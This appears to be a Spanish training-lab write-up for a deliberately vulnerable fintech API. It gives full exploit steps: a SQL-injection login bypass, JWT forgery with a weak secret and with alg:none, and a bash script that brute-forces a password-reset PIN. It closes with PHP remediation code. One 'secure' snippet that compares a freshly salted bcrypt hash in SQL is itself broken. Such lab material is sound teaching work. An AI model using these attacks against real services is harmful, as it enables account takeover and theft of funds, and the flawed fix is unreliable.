# LAB 02 - Broken Authentication

## Referencia OWASP: API2:2023 - Broken Authentication

---

## Objetivo

Explotar multiples fallas de autenticacion en la API de CryptoVulnX: inyeccion SQL en el login, manipulacion de tokens JWT con secreto debil, algoritmo none en JWT y fuerza bruta de PIN de restablecimiento de contrasena.

---

## Contexto

La vulnerabilidad de Broken Authentication agrupa multiples fallas en los mecanismos de autenticacion de una API. En CryptoVulnX, el sistema de autenticacion presenta las siguientes debilidades:

1. **Inyeccion SQL en login**: El endpoint de autenticacion concatena directamente los parametros del usuario en la consulta SQL sin sanitizacion ni sentencias preparadas.
2. **JWT con secreto debil**: Los tokens JWT se firman con el secreto `crypto123`, un valor facilmente adivinable o crackeable por diccionario.
3. **JWT acepta algoritmo none**: La implementacion acepta tokens con `alg:none`, lo que permite generar tokens sin firma valida.
4. **PIN de 4 digitos sin rate limiting**: El sistema de restablecimiento de contrasena utiliza un PIN de solo 4 digitos (0000-9999) y no implementa ninguna limitacion de intentos.

En una plataforma fintech, estas vulnerabilidades permiten el acceso completo a cuentas de usuario, incluyendo fondos y operaciones financieras.

---

## Endpoints Involucrados

| Metodo | Endpoint | Descripcion |
|--------|----------|-------------|
| `POST` | `/api/v1/auth/login.php` | Autenticacion de usuarios (vulnerable a SQLi) |
| `POST` | `/api/v1/auth/reset.php` | Restablecimiento de contrasena con PIN de 4 digitos |

---

## Dificultad

**Media** - Requiere conocimiento de inyeccion SQL, estructura JWT y scripting para fuerza bruta.

---

## Pistas

### Pista 1 - Inyeccion SQL
El campo `username` en el login se concatena directamente en la consulta SQL. ¿Que pasaria si envias un valor que modifique la logica de la consulta? Piensa en como terminar la condicion del usuario y comentar el resto de la consulta.

### Pista 2 - Manipulacion JWT
Decodifica el token JWT recibido al hacer login (usa base64 en la parte del payload). Observa los campos `role` y `sub`. El secreto de firma es una palabra comun seguida de numeros. Herramientas como jwt.io o hashcat con diccionario pueden revelarlo rapidamente.

### Pista 3 - Fuerza bruta del PIN
El endpoint de reset acepta un PIN de 4 digitos y no tiene ningun mecanismo de rate limiting. Con solo 10,000 combinaciones posibles (0000-9999), un script simple puede probar todas en cuestion de segundos.

---

## Solucion

### Ataque 1 - Inyeccion SQL en Login

La consulta vulnerable en el servidor es similar a:
```sql
SELECT * FROM users WHERE username = '$username' AND password = '$password'
```

#### Paso 1 - Bypass de autenticacion con SQLi

```bash
curl -s -X POST http://localhost/appsec/api/v1/auth/login.php \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' -- ","password":"cualquiercosa"}'
```

La consulta resultante sera:
```sql
SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'cualquiercosa'
```

Todo despues de `--` es un comentario SQL, por lo que la verificacion de password se ignora.

Respuesta esperada:
```json
{
  "status": "success",
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjEsInVzZXJuYW1lIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MTE2MDAwMDB9...",
  "user_id": 1,
  "role": "admin"
}
```

---

### Ataque 2 - Manipulacion de JWT con Secreto Debil

#### Paso 1 - Autenticarse como usuario normal

```bash
curl -s -X POST http://localhost/appsec/api/v1/auth/login.php \
  -H "Content-Type: application/json" \
  -d '{"username":"carlos","password":"carlos2024"}'
```

#### Paso 2 - Decodificar el token JWT

```bash
# Extraer y decodificar el payload del JWT
echo "eyJzdWIiOjMsInVzZXJuYW1lIjoiY2FybG9zIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3MTE2MDAwMDB9" | base64 -d
```

Resultado:
```json
{"sub":3,"username":"carlos","role":"user","iat":1711600000}
```

#### Paso 3 - Generar un nuevo JWT con rol admin usando el secreto "crypto123"

```bash
# Generar JWT manipulado con PHP
php -r '
$header = base64_encode(json_encode(["alg"=>"HS256","typ"=>"JWT"]));
$payload = base64_encode(json_encode(["sub"=>3,"username"=>"carlos","role"=>"admin","iat"=>time()]));
$header = rtrim(strtr($header, "+/", "-_"), "=");
$payload = rtrim(strtr($payload, "+/", "-_"), "=");
$signature = rtrim(strtr(base64_encode(hash_hmac("sha256", "$header.$payload", "crypto123", true)), "+/", "-_"), "=");
echo "$header.$payload.$signature\n";
'
```

#### Paso 4 - Usar el token forjado para acceder como admin

```bash
curl -s -X GET http://localhost/appsec/api/v1/admin/users.php \
  -H "Authorization: Bearer <TOKEN_FORJADO>"
```

---

### Ataque 3 - JWT con Algoritmo None

#### Paso 1 - Construir un JWT sin firma

```bash
# Generar JWT con alg:none
php -r '
$header = rtrim(strtr(base64_encode(json_encode(["alg"=>"none","typ"=>"JWT"])), "+/", "-_"), "=");
$payload = rtrim(strtr(base64_encode(json_encode(["sub"=>1,"username"=>"admin","role"=>"admin","iat"=>time()])), "+/", "-_"), "=");
echo "$header.$payload.\n";
'
```

#### Paso 2 - Usar el token sin firma

```bash
curl -s -X GET http://localhost/appsec/api/v1/admin/users.php \
  -H "Authorization: Bearer <TOKEN_ALG_NONE>"
```

El servidor acepta el token porque la implementacion no valida correctamente el algoritmo y acepta `none` como valido.

---

### Ataque 4 - Fuerza Bruta de PIN de Restablecimiento

#### Paso 1 - Solicitar restablecimiento de contrasena

```bash
curl -s -X POST http://localhost/appsec/api/v1/auth/reset.php \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@cryptovulnx.com","action":"request"}'
```

#### Paso 2 - Script de fuerza bruta para el PIN de 4 digitos

```bash
#!/bin/bash
# brute_force_pin.sh
TARGET="http://localhost/appsec/api/v1/auth/reset.php"

for pin in $(seq -w 0000 9999); do
  response=$(curl -s -X POST "$TARGET" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"admin@cryptovulnx.com\",\"action\":\"verify\",\"pin\":\"$pin\",\"new_password\":\"hackeado123\"}")

  if echo "$response" | grep -q "success"; then
    echo "[+] PIN encontrado: $pin"
    echo "[+] Respuesta: $response"
    break
  fi
done
```

```bash
chmod +x brute_force_pin.sh && ./brute_force_pin.sh
```

Con solo 10,000 combinaciones posibles y sin rate limiting, el PIN se encuentra en segundos.

---

## Remediacion

### 1. Corregir Inyeccion SQL - Usar Sentencias Preparadas

```php
// VULNERABLE
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$result = $conn->query($query);

// SEGURO - Sentencias preparadas
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password_hash = ?");
$password_hash = password_hash($password, PASSWORD_BCRYPT);
$stmt->bind_param("ss", $username, $password_hash);
$stmt->execute();

// Mejor aun: verificar hash con password_verify()
$stmt = $conn->prepare("SELECT id, password_hash, role FROM users WHERE username = ?");
$stmt->bind_param("s", $username);
$stmt->execute();
$user = $stmt->get_result()->fetch_assoc();

if ($user && password_verify($password, $user['password_hash'])) {
    // Autenticacion exitosa
} else {
    http_response_code(401);
    echo json_encode(["error" => "Credenciales invalidas"]);
}
```

### 2. Corregir JWT - Secreto Fuerte y Validacion de Algoritmo

```php
// VULNERABLE
$secret = "crypto123";
$decoded = JWT::decode($token, $secret); // Acepta cualquier algoritmo

// SEGURO
$secret = bin2hex(random_bytes(64)); // Secreto aleatorio de 128 caracteres hex
// Almacenar en variable de entorno, NO en el codigo

$decoded = JWT::decode($token, new Key($secret, 'HS256')); // Forzar algoritmo HS256

// Agregar expiracion al token
$payload = [
    "sub" => $user['id'],
    "username" => $user['username'],
    "role" => $user['role'],
    "iat" => time(),
    "exp" => time() + 3600 // Expira en 1 hora
];
$token = JWT::encode($payload, $secret, 'HS256');
```

### 3. Corregir PIN - Rate Limiting y PIN mas Largo

```php
// SEGURO - Rate limiting y PIN de 8 digitos
function verifyResetPin($email, $pin) {
    // Verificar intentos recientes
    $stmt = $conn->prepare("SELECT COUNT(*) as attempts FROM reset_attempts
                            WHERE email = ? AND attempted_at > DATE_SUB(NOW(), INTERVAL 15 MINUTE)");
    $stmt->bind_param("s", $email);
    $stmt->execute();
    $result = $stmt->get_result()->fetch_assoc();

    if ($result['attempts'] >= 5) {
        http_response_code(429);
        echo json_encode(["error" => "Demasiados intentos. Intente en 15 minutos."]);
        exit;
    }

    // Registrar intento
    $stmt = $conn->prepare("INSERT INTO reset_attempts (email, attempted_at) VALUES (?, NOW())");
    $stmt->bind_param("s", $email);
    $stmt->execute();

    // Usar PIN de 8 digitos minimo
    // Mejor: usar token aleatorio largo en lugar de PIN numerico
    $reset_token = bin2hex(random_bytes(32));
}
```

### Principios de Remediacion

1. **Sentencias preparadas**: Nunca concatenar entrada del usuario en consultas SQL.
2. **Secretos JWT fuertes**: Usar secretos aleatorios de al menos 256 bits, almacenados en variables de entorno.
3. **Validar algoritmo JWT**: Forzar el algoritmo esperado y rechazar `none`.
4. **Expiracion de tokens**: Siempre incluir `exp` en los tokens JWT.
5. **Rate limiting**: Limitar intentos de autenticacion y restablecimiento (5 intentos cada 15 minutos).
6. **PINs largos o tokens**: Usar tokens aleatorios largos en lugar de PINs numericos cortos.
7. **Hashear contrasenas**: Usar `password_hash()` con bcrypt y verificar con `password_verify()`.
